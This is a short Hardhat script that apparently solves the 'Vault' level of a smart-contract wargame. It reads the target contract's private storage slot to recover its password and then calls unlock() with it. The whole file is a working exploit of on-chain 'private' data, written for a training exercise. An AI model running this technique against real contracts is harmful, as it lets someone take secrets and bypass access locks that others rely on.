const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x7Fd940Fa3B38217D7557D12897aB6468734a6ceA";
    contractName = "Vault";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    // const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    // const attacker = await Attacker.deploy(levelAddress,{value: hre.ethers.utils.parseEther("0.00001")});
    // console.log(`Attacker at ${attacker.address}`);

    password = hre.ethers.provider.getStorageAt(levelAddress,1);
    tx = await level.unlock(password);
    tr = await tx.wait();
    
    result = await level.locked()
    console.log(!result);
    
    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
